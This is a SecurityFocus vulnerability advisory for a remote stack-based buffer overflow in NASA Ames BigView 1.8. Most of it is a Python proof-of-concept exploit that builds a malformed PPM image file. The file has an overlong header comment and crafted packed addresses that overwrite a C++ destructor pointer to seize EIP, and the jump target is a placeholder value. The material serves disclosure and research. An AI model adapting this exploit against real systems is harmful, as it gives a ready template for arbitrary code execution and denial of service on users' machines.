source: http://www.securityfocus.com/bid/29517/info

NASA Ames Research Center BigView is prone to a remote stack-based buffer-overflow vulnerability because it fails to properly bounds-check user-supplied data before copying it to an insufficiently sized memory buffer.

An attacker can exploit this issue to execute arbitrary code in the context of the application. Successful attacks will compromise the application and underlying computer. Failed exploit attempts will result in a denial of service.

BigView 1.8 is vulnerable; other versions may also be affected. 

/-----------

## BigView exploit
## Alfredo Ortega - Core Security Exploit Writers Team (EWT)
## Works against BigView "browse" revision 1.8 compiled on ubuntu 6.06
Desktop i386

import struct
w = open("crash.ppm","wb")
w.write("""P3
#CREATOR: The GIMP's PNM Filter Version
1.0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA""")
# This exploit is not trivial, because the function PPM::ppmHeader()
doesn't return inmmediately, and we must modify internal variables to
cause an overwrite of a C++ string destructor executed at the end of the
function to gain control of EIP
# PS.: Congrats for the Phoenix mars Lander!
for i in range(7):
                w.write(chr(i)*4)
w.write("AA")
w.write(struct.pack("<L",0xaaaaaaaa))
w.write(struct.pack("<L",0xbbbbbbbb))
w.write(struct.pack("<L",0xcccccccc))
w.write(struct.pack("<L",0x08080000))
w.write(struct.pack("<L",0x08080000)*48)

#The address of the destructor is hard-coded. Sorry but this is only a 
PoC!
destination = 0x0805b294 # destructor
value = 0x41414141 #address to jump to
w.write(struct.pack("<L",destination)) # destination

w.write("""
%d 300
255
255
255
255
""" % value)
w.close()

- -----------/ 